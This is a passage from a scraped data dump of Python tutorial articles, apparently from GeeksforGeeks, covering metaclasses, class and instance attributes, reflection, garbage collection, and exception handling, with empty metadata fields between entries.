\"<stdin>\", line 8, in __new__\nTypeError: Inherited multiple base classes!!!Solving problems with metaclassThere are some problems which can be solved by decorators (easily) as well as by metaclasses. But there are a few problems whose results can only be achieved by metaclasses. For example, consider a very simple problem of code repetition.\u00a0We want to debug class methods, what we want is that whenever the class method executes, it should print its fully qualified name before executing its body.The very first solution that comes to our mind is using method decorators, following is the sample code \u2013\u00a0Python3from functools import wraps\u00a0def debug(func):\u00a0\u00a0\u00a0\u00a0'''decorator for debugging passed function'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0@wraps(func)\u00a0\u00a0\u00a0\u00a0def wrapper(*args, **kwargs):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Full name of this method:\", func.__qualname__)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return func(*args, **kwargs)\u00a0\u00a0\u00a0\u00a0return wrapper\u00a0def debugmethods(cls):\u00a0\u00a0\u00a0\u00a0'''class decorator make use of debug decorator\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0to debug class methods '''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# check in class dictionary for any callable(method)\u00a0\u00a0\u00a0\u00a0# if exist, replace it with debugged version\u00a0\u00a0\u00a0\u00a0for key, val in vars(cls).items():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if callable(val):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0setattr(cls, key, debug(val))\u00a0\u00a0\u00a0\u00a0return cls\u00a0# sample class@debugmethodsclass Calc:\u00a0\u00a0\u00a0\u00a0def add(self, x, y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x+y\u00a0\u00a0\u00a0\u00a0def mul(self, x, y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x*y\u00a0\u00a0\u00a0\u00a0def div(self, x, y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x/y\u00a0\u00a0\u00a0\u00a0\u00a0mycal = Calc()print(mycal.add(2, 3))print(mycal.mul(5, 2))Output:\u00a0Full name of this method: Calc.add\n5\nFull name of this method: Calc.mul\n10This solution works fine but there is one problem, what if we want to apply this method decorator to all subclasses which inherit this Calc class. In that case, we have to separately apply the method decorator to every subclass just like we did with the Calc class.The problem is if we have many such subclasses, then in that case we won\u2019t like adding a decorator to each one separately. If we know beforehand that every subclass must have this debug property, then we should look up to the metaclass-based solution.Have a look at this metaclass based solution, the idea is that classes will be created normally and then immediately wrapped up by debug method decorator \u2013\u00a0Python3from functools import wraps\u00a0def debug(func):\u00a0\u00a0\u00a0\u00a0'''decorator for debugging passed function'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0@wraps(func)\u00a0\u00a0\u00a0\u00a0def wrapper(*args, **kwargs):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Full name of this method:\", func.__qualname__)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return func(*args, **kwargs)\u00a0\u00a0\u00a0\u00a0return wrapper\u00a0def debugmethods(cls):\u00a0\u00a0\u00a0\u00a0'''class decorator make use of debug decorator\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0to debug class methods '''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for key, val in vars(cls).items():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if callable(val):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0setattr(cls, key, debug(val))\u00a0\u00a0\u00a0\u00a0return cls\u00a0class debugMeta(type):\u00a0\u00a0\u00a0\u00a0'''meta class which feed created class object\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0to debugmethod to get debug functionality\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0enabled objects'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __new__(cls, clsname, bases, clsdict):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0obj = super().__new__(cls, clsname, bases, clsdict)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0obj = debugmethods(obj)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return obj\u00a0\u00a0\u00a0\u00a0\u00a0# base class with metaclass 'debugMeta'# now all the subclass of this# will have debugging appliedclass Base(metaclass=debugMeta):pass\u00a0# inheriting Baseclass Calc(Base):\u00a0\u00a0\u00a0\u00a0def add(self, x, y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x+y\u00a0\u00a0\u00a0\u00a0\u00a0# inheriting Calcclass Calc_adv(Calc):\u00a0\u00a0\u00a0\u00a0def mul(self, x, y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x*y\u00a0# Now Calc_adv object showing# debugging behaviourmycal = Calc_adv()print(mycal.mul(2, 3))Output:\u00a0Full name of this method: Calc_adv.mul\n6When to use MetaclassesMost of the time we do not use metaclasses, it\u2019s usually used for something complicated, but a few cases where we use metaclasses are \u2013\u00a0As we have seen in the above example, metaclasses propagate down the inheritance hierarchies. It will affect all the subclasses as well. If we have such a situation, then we should use metaclasses.If we want to change class automatically, when it is created, we use metaclassesFor API development, we might use metaclassesAs quoted by Tim Peters\u00a0Metaclasses are deeper magic that 99% of users should never worry about. If you wonder whether you need them, you don\u2019t (the people who actually need them know with certainty that they need them, and don\u2019t need an explanation about why).\u00a0Referenceshttp://www.dabeaz.com/py3meta/Py3Meta.pdfhttps://stackoverflow.com/questions/100003/what-is-a-metaclass-in-pythonThis article is contributed by Atul Kumar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "2d4c291ed22c4fc14e80ca7b3d882f34",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Class attributesClass attributes belong to the class itself they will be shared by all the instances. Such attributes are defined in the class body parts usually at the top, for legibility.# Write Python code hereclass sampleclass:\u00a0\u00a0\u00a0\u00a0count = 0\u00a0\u00a0\u00a0\u00a0 # class attribute\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def increase(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sampleclass.count += 1\u00a0\u00a0# Calling increase() on an objects1 = sampleclass()s1.increase()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(s1.count)\u00a0\u00a0# Calling increase on one more# objects2 = sampleclass()s2.increase()print(s2.count)\u00a0\u00a0print(sampleclass.count)Output:1              \r\n2                           \r\n2Instance AttributesUnlike class attributes, instance attributes are not shared by objects. Every object has its own copy of the instance attribute (In case of class attributes all object refer to single copy).To list the attributes of an instance/object, we have two functions:-1. vars()\u2013 This function displays the attribute of an instance in the form of an dictionary.2. dir()\u2013 This function displays more attributes than vars function,as it is not limited to instance. It displays the class attributes as well. It also displays the attributes of its ancestor classes.# Python program to demonstrate# instance attributes.class emp:\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = 'xyz'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.salary = 4000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def show(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(self.name)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(self.salary)\u00a0\u00a0e1 = emp()print(\"Dictionary form :\", vars(e1))print(dir(e1))Output :\r\nDictionary form :{'salary': 4000, 'name': 'xyz'}\r\n['__doc__', '__init__', '__module__', 'name', 'salary', 'show']This article is contributed by Harsh Valecha. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "0e348ea3c6dc6bb29ba538844ea0e8e6",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Reflection refers to the ability for code to be able to examine attributes about objects that might be passed as parameters to a function. For example, if we write type(obj) then Python will return an object which represents the type of obj.Using reflection, we can write one recursive reverse function that will work for strings, lists, and any other sequence that supports slicing and concatenation. If an obj is a reference to a string, then Python will return the str type object. Further, if we write str() we get a string which is the empty string. In other words, writing str() is the same thing as writing \u201c\u201d. Likewise, writing list() is the same thing as writing [].# Python program to illustrate reflection\u00a0def reverse(sequence):\u00a0\u00a0\u00a0\u00a0\u00a0sequence_type = type(sequence)\u00a0\u00a0\u00a0\u00a0\u00a0empty_sequence = sequence_type()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if sequence == empty_sequence:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return empty_sequence\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0rest = reverse(sequence[1:])\u00a0\u00a0\u00a0\u00a0\u00a0first_sequence = sequence[0:1]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Combine the result\u00a0\u00a0\u00a0\u00a0\u00a0final_result = rest + first_sequence\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return final_result\u00a0\u00a0\u00a0# Driver code\u00a0print(reverse([10, 20, 30, 40]))\u00a0print(reverse(\"GeeksForGeeks\"))\u00a0Output:\r\n[40, 30, 20, 10]\r\nskeeGroFskeeG\r\nReflection-enabling functionsReflection-enabling functions include type(), isinstance(), callable(), dir() and getattr().type and isinstance \u2013 Refer hereCallable() :A callable means anything that can be called. For an object, determines whether it can be called. A class can be made callable by providing a __call__() method. The callable() method returns True if the object passed appears callable. If not, it returns False.Examples:x = 5\r\n\r\ndef testFunction():\r\n  print(\"Test\")\r\n   \r\ny = testFunction\r\n\r\nif (callable(x)):\r\n    print(\"x is callable\")\r\nelse:\r\n    print(\"x is not callable\")\r\n\r\nif (callable(y)):\r\n    print(\"y is callable\")\r\nelse:\r\n    print(\"y is not callable\")\r\nOutput:x is not callable\r\ny is callablecallable when used in OOP\r\nclass Foo1:\r\n  def __call__(self):\r\n    print('Print Something')\r\n\r\nprint(callable(Foo1))\r\nOutput:\r\nTrueDir : The dir() method tries to return a list of valid attributes of the object. The dir() tries to return a list of valid attributes of the object.If the object has __dir__() method, the method will be called and must return the list of attributes.If the object doesn\u2019t have __dir()__ method, this method tries to find information from the __dict__ attribute (if defined), and from type object. In this case, the list returned from dir() may not be complete.Examples:number = [1,2,3]\r\nprint(dir(number))\r\n\r\ncharacters = [\"a\", \"b\"]\r\nprint(dir(number))Output:Getattr : The getattr() method returns the value of the named attribute of an object. If not found, it returns the default value provided to the function.The getattr method takes three parameters object, name and default(optional).class Employee:\r\n    salary = 25000\r\n    company_name= \"geeksforgeeks\"\r\n\r\nemployee = Employee()\r\nprint('The salary is:', getattr(employee, \"salary\"))\r\nprint('The salary is:', employee.salary)Output:The salary is: 25000\r\nThe salary is: 25000Reference links2. docs_python3. wikibooksThis article is contributed by Subhajit Saha. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "4e67367d62032f8bd2f86a0add0398c1",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python\u2019s memory allocation and deallocation method is automatic. The user does not have to preallocate or deallocate memory similar to using dynamic memory allocation in languages such as C or C++.\u00a0Python uses two strategies for memory allocation:\u00a0Reference countingGarbage collectionPrior to Python version 2.0, the Python interpreter only used reference counting for memory management. Reference counting works by counting the number of times an object is referenced by other objects in the system. When references to an object are removed, the reference count for an object is decremented. When the reference count becomes zero, the object is deallocated. Ex-\u00a0Python# Literal 9 is an objectb = 9\u00a0# Reference count of object 9# becomes 0.b = 4The literal value 9 is an object. The reference count of object 9 is incremented to 1 in line 1. In line 2 its reference count becomes zero as it is dereferenced. So garbage collector deallocates the object.A reference cycle is created when there is no way the reference count of the object can reach. Reference cycles involving lists, tuples, instances, classes, dictionaries, and functions are common. The easiest way to create a reference cycle is to create an object which refers to itself as in the example below:\u00a0Pythondef create_cycle():\u00a0\u00a0\u00a0\u00a0\u00a0# create a list x\u00a0\u00a0\u00a0\u00a0x = [ ]\u00a0\u00a0\u00a0\u00a0\u00a0# A reference cycle is created\u00a0\u00a0\u00a0\u00a0# here as x contains reference to\u00a0\u00a0\u00a0\u00a0# to self.\u00a0\u00a0\u00a0\u00a0x.append(x)\u00a0\u00a0create_cycle()Because create_cycle() creates an object x which refers to itself, the object x will not automatically be freed when the function returns. This will cause the memory that x is using to be held onto until the Python garbage collector is invoked.Ways to make an object eligible for garbage collectionPythonx = []x.append(l)x.append(2)\u00a0# delete the list from memory or# assigning object x to None(Null)del x# x = NoneThe reference count for the list created is now two. However, since it cannot be reached from inside Python and cannot possibly be used again, it is considered garbage. In the current version of Python, this list is never freed.\u00a0\u00a0Automatic Garbage Collection of CyclesBecause reference cycles take computational work to discover, garbage collection must be a scheduled activity. Python schedules garbage collection based upon a threshold of object allocations and object deallocations. When the number of allocations minus the number of deallocations is greater than the threshold number, the garbage collector is run. One can inspect the threshold for new objects (objects in Python known as generation 0 objects) by importing the gc module and asking for garbage collection thresholds:\u00a0\u00a0Python# loading gcimport gc\u00a0# get the current collection# thresholds as a tupleprint(\"Garbage collection thresholds:\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0gc.get_threshold())Output:\u00a0Garbage collection thresholds: (700, 10, 10) Here, the default threshold on the above system is 700. This means when the number of allocations vs. the number of deallocations is greater than 700 the automatic garbage collector will run. Thus any portion of your code which frees up large blocks of memory is a good candidate for running manual garbage collection.\u00a0\u00a0Manual Garbage CollectionInvoking the garbage collector manually during the execution of a program can be a good idea on how to handle memory being consumed by reference cycles.\u00a0The garbage collection can be invoked manually in the following way:\u00a0Python# Importing gc moduleimport gc\u00a0# Returns the number of# objects it has collected# and deallocatedcollected = gc.collect()\u00a0# Prints Garbage collector# as 0 objectprint(\"Garbage collector: collected\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"%d objects.\" % collected)Output:('Garbage collector: collected', '0 objects.')If few cycles are created, then how manual collection works:\u00a0Example:\u00a0Pythonimport gci = 0\u00a0# create a cycle and on each iteration x as a dictionary# assigned to 1def create_cycle():\u00a0\u00a0\u00a0\u00a0x = { }\u00a0\u00a0\u00a0\u00a0x[i+1] = x\u00a0\u00a0\u00a0\u00a0print x\u00a0# lists are cleared whenever a full collection or# collection of the highest generation (2) is runcollected = gc.collect() # or gc.collect(2)print \"Garbage collector: collected %d objects.\" % (collected)\u00a0print \"Creating cycles...\"for i in range(10):\u00a0\u00a0\u00a0\u00a0create_cycle()\u00a0collected = gc.collect()\u00a0print \"Garbage collector: collected %d objects.\" % (collected)Output:\u00a0Garbage collector: collected 0 objects.\nCreating cycles...\n{1: {...}}\n{2: {...}}\n{3: {...}}\n{4: {...}}\n{5: {...}}\n{6: {...}}\n{7: {...}}\n{8: {...}}\n{9: {...}}\n{10: {...}}\nGarbage collector: collected 10 objects.There are two ways for performing manual garbage collection: time-based and event-based garbage collection.\u00a0Time-based garbage collection is simple: the garbage collector is called after a fixed time interval.\u00a0Event-based garbage collection calls the garbage collector on event occurrence. For example, when a user exits the application or when the application enters into idle state.\u00a0\u00a0Reference\u00a0Python DocsMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ca562260695a59dee55ca09b9c89848c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "We have explored basic python till now from Set 1 to 4 (Set 1 | Set 2 | Set 3 | Set 4).\u00a0In this article, we will discuss how to handle exceptions in Python using try. catch, and finally statement with the help of proper examples.\u00a0Error in Python can be of two types i.e. Syntax errors and Exceptions. Errors are the problems in a program due to which the program will stop the execution. On the other hand, exceptions are raised when some internal events occur which changes the normal flow of the program.\u00a0Difference between Syntax Error and ExceptionsSyntax Error: As the name suggests this error is caused by the wrong syntax in the code. It leads to the termination of the program.\u00a0Example:\u00a0Python3# initialize the amount variableamount = 10000\u00a0# check that You are eligible to#\u00a0 purchase Dsa Self Paced or notif(amount > 2999)print(\"You are eligible to purchase Dsa Self Paced\")Output:Exceptions: Exceptions are raised when the program is syntactically correct, but the code resulted in an error. This error does not stop the execution of the program, however, it changes the normal flow of the program.Example:Python3# initialize the amount variablemarks = 10000\u00a0# perform division with 0a = marks / 0print(a)Output:In the above example raised the ZeroDivisionError as we are trying to divide a number by 0.Note: Exception is the base class for all the exceptions in Python. You can check the exception hierarchy here.\u00a0\u00a0Try and Except Statement \u2013 Catching ExceptionsTry and except statements are used to catch and handle exceptions in Python. Statements that can raise exceptions are kept inside the try clause and the statements that handle the exception are written inside except clause.Example: Let us try to access the array element whose index is out of bound and handle the corresponding exception.Python3# Python program to handle simple runtime error#Python 3\u00a0a = [1, 2, 3]try:\u00a0\u00a0\u00a0\u00a0print (\"Second element = %d\" %(a[1]))\u00a0\u00a0\u00a0\u00a0\u00a0# Throws error since there are only 3 elements in array\u00a0\u00a0\u00a0\u00a0print (\"Fourth element = %d\" %(a[3]))\u00a0except:\u00a0\u00a0\u00a0\u00a0print (\"An error occurred\")OutputSecond element = 2\nAn error occurredIn the above example, the statements that can cause the error are placed inside the try statement (second print statement in our case). The second print statement tries to access the fourth element of the list which is not there and this throws an exception. This exception is then caught by the except statement.Catching Specific ExceptionA try statement can have more than one except clause, to specify handlers for different exceptions. Please note that at most one handler will be executed. For example, we can add IndexError in the above code. The general syntax for adding specific exceptions are \u2013\u00a0try:\n    # statement(s)\nexcept IndexError:\n    # statement(s)\nexcept ValueError:\n    # statement(s)Example: Catching specific exception in PythonPython3# Program to handle multiple errors with one# except statement# Python 3\u00a0def fun(a):\u00a0\u00a0\u00a0\u00a0if a < 4:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# throws ZeroDivisionError for a = 3\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0b = a/(a-3)\u00a0\u00a0\u00a0\u00a0\u00a0# throws NameError if a >= 4\u00a0\u00a0\u00a0\u00a0print(\"Value of b = \", b)\u00a0\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0fun(3)\u00a0\u00a0\u00a0\u00a0fun(5)\u00a0# note that braces () are necessary here for# multiple exceptionsexcept ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0print(\"ZeroDivisionError Occurred and Handled\")except NameError:\u00a0\u00a0\u00a0\u00a0print(\"NameError Occurred and Handled\")OutputZeroDivisionError Occurred and HandledIf you comment on the line fun(3), the output will be\u00a0NameError Occurred and HandledThe output above is so because as soon as python tries to access the value of b, NameError occurs.\u00a0Try with Else ClauseIn python, you can also use the else clause on the try-except block which must be present after all the except clauses. The code enters the else block only if the try clause does not raise an exception.Example: Try with else clausePython3# Program to depict else clause with try-except# Python 3# Function which returns a/bdef AbyB(a , b):\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c = ((a+b) / (a-b))\u00a0\u00a0\u00a0\u00a0except ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"a/b result in 0\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (c)\u00a0# Driver program to test above functionAbyB(2.0, 3.0)AbyB(3.0, 3.0)Output:-5.0\na/b result in 0 Finally Keyword in PythonPython provides a keyword finally, which is always executed after the try and except blocks. The final block always executes after normal termination of try block or after try block terminates due to some exception.Syntax:try:\n    # Some Code.... \n\nexcept:\n    # optional block\n    # Handling of exception (if required)\n\nelse:\n    # execute if no exception\n\nfinally:\n    # Some code .....(always executed)Example:Python3# Python program to demonstrate finally\u00a0# No exception Exception raised in try blocktry:\u00a0\u00a0\u00a0\u00a0k = 5//0\u00a0 # raises divide by zero exception.\u00a0\u00a0\u00a0\u00a0print(k)\u00a0# handles zerodivision exceptionexcept ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0print(\"Can't divide by zero\")\u00a0finally:\u00a0\u00a0\u00a0\u00a0# this block is always executed\u00a0\u00a0\u00a0\u00a0# regardless of exception generation.\u00a0\u00a0\u00a0\u00a0print('This is always executed')Output:Can't divide by zero\nThis is always executedRaising ExceptionThe raise statement allows the programmer to force a specific exception to occur. The sole argument in raise indicates the exception to be raised. This must be either an exception instance or an exception class (a class that derives from Exception).Python3# Program to depict Raising Exception\u00a0try:\u00a0\u00a0\u00a0\u00a0raise NameError(\"Hi there\")\u00a0 # Raise Errorexcept NameError:\u00a0\u00a0\u00a0\u00a0print (\"An exception\")\u00a0\u00a0\u00a0\u00a0raise\u00a0 # To determine whether the exception was raised or notThe output of the above code will simply line printed as \u201cAn exception\u201d but a Runtime error will also occur in the last due to the raise statement in the last line. So, the output on your command line will look like\u00a0Traceback (most recent call last):\n  File \"/home/d6ec14ca595b97bff8d8034bbf212a9f.py\", line 5, in <module>\n    raise NameError(\"Hi there\")  # Raise Error\nNameError: Hi therehttps://youtu.be/fCRB8ADbBScThis article is contributed by Nikhil Kumar Singh(nickzuck_007)\u00a0Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "24849429c8d29ddcfe896bffbe425026",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite- This article is an extension to Exception Handling.Python throws errors and exceptions when there is a code gone wrong, which may cause the program to stop abruptly. Python also provides an exception handling method with the help of try-except. Some of the standard exceptions which are most frequent include IndexError, ImportError, IOError, ZeroDivisionError, TypeError, and FileNotFoundError. A user can create his own error using the exception class.\u00a0Creating User-defined ExceptionProgrammers may name their own exceptions by creating a new exception class. Exceptions need to be derived from the Exception class, either directly or indirectly. Although not mandatory, most of the exceptions are named as names that end in \u201cError\u201d similar to the naming of the standard exceptions in python. For example:\u00a0PYTHON# A python program to create user-defined exception\u00a0# class MyError is derived from super class Exceptionclass MyError(Exception):\u00a0\u00a0\u00a0\u00a0\u00a0# Constructor or Initializer\u00a0\u00a0\u00a0\u00a0def __init__(self, value):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.value = value\u00a0\u00a0\u00a0\u00a0\u00a0# __str__ is to print() the value\u00a0\u00a0\u00a0\u00a0def __str__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return(repr(self.value))\u00a0try:\u00a0\u00a0\u00a0\u00a0raise(MyError(3*2))\u00a0# Value of Exception is stored in errorexcept MyError as error:\u00a0\u00a0\u00a0\u00a0print('A New Exception occured: ',error.value)Output:\u00a0('A New Exception occured: ', 6)Knowing all about Exception ClassTo know more about class Exception, run the code below\u00a0PYTHONhelp(Exception)Deriving Error from Super Class ExceptionSuperclass Exceptions are created when a module needs to handle several distinct errors. One of the common ways of doing this is to create a base class for exceptions defined by that module. Further, various subclasses are defined to create specific exception classes for different error conditions.\u00a0PYTHON# class Error is derived from super class Exceptionclass Error(Exception):\u00a0\u00a0\u00a0\u00a0\u00a0# Error is derived class for Exception, but\u00a0\u00a0\u00a0\u00a0# Base class for exceptions in this module\u00a0\u00a0\u00a0\u00a0pass\u00a0class TransitionError(Error):\u00a0\u00a0\u00a0\u00a0\u00a0# Raised when an operation attempts a state\u00a0\u00a0\u00a0\u00a0# transition that's not allowed.\u00a0\u00a0\u00a0\u00a0def __init__(self, prev, nex, msg):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.prev = prev\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.next = nex\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Error message thrown is saved in msg\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.msg = msgtry:\u00a0\u00a0\u00a0\u00a0raise(TransitionError(2,3*2,\"Not Allowed\"))\u00a0# Value of Exception is stored in errorexcept TransitionError as error:\u00a0\u00a0\u00a0\u00a0print('Exception occured: ',error.msg)Output:\u00a0\u00a0('Exception occured: ', 'Not Allowed')How to use standard Exceptions as a base class?A runtime error is a class that is a standard exception that is raised when a generated error does not fall into any category. This program illustrates how to use runtime error as base class and network error as derived class. In a similar way, an exception can be derived from the standard exceptions of Python.\u00a0PYTHON# NetworkError has base RuntimeError# and not Exceptionclass Networkerror(RuntimeError):\u00a0\u00a0\u00a0\u00a0def __init__(self, arg):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.args = arg\u00a0try:\u00a0\u00a0\u00a0\u00a0raise Networkerror(\"Error\")\u00a0except Networkerror as e:\u00a0\u00a0\u00a0\u00a0print (e.args)Output:\u00a0\u00a0('E', 'r', 'r', 'o', 'r')This article is contributed by Piyush Doorwar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "351fe1bae28975860da7039c1b4fe739",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "All instances in Python must be instances of a class that derives from BaseException. Two exception classes that are not related via subclassing are never equivalent, even if they have the same name. The built-in exceptions can be generated by the interpreter or built-in functions.There are several built-in exceptions in Python that are raised when errors occur. These built-in exceptions can be viewed using the local() built-in functions as follows :\r\n>>> locals()['__builtins__']\r\nThis returns a dictionary of built-in exceptions, functions and attributes.Base ClassesThe following exceptions are used mostly as base classes for other exceptions.exception BaseExceptionThis is the base class for all built-in exceptions. It is not meant to be directly inherited by user-defined classes. For, user-defined classes, Exception is used. This class is responsible for creating a string representation of the exception using str() using the arguments passed. An empty string is returned if there are no arguments.args : The args are the tuple of arguments given to the exception constructor.with_traceback(tb) : This method is usually used in exception handling. This method sets tb as the new traceback for the exception and returns the exception object.Code :\r\ntry:\r\n    ...\r\nexcept SomeException:\r\n    tb = sys.exc_info()[2]\r\n    raise OtherException(...).with_traceback(tb)\r\nexception ExceptionThis is the base class for all built-in non-system-exiting exceptions. All user-defined exceptions should also be derived from this class.exception ArithmeticErrorThis class is the base class for those built-in exceptions that are raised for various arithmetic errors such as :OverflowErrorZeroDivisionErrorFloatingPointErrorExample :try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0a = 10/0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (a)except ArithmeticError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"This statement is raising an arithmetic exception.\")else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"Success.\")Output :\r\nThis statement is raising an arithmetic exception.\r\nexception BufferErrorThis exception is raised when buffer related operations cannot be performed.exception LookupErrorThis is the base class for those exceptions that are raised when a key or index used on a mapping or sequence is invalid or not found. The exceptions raised are :KeyErrorIndexErrorExample :try:\u00a0\u00a0\u00a0\u00a0\u00a0a = [1, 2, 3]\u00a0\u00a0\u00a0\u00a0\u00a0print (a[3])\u00a0except 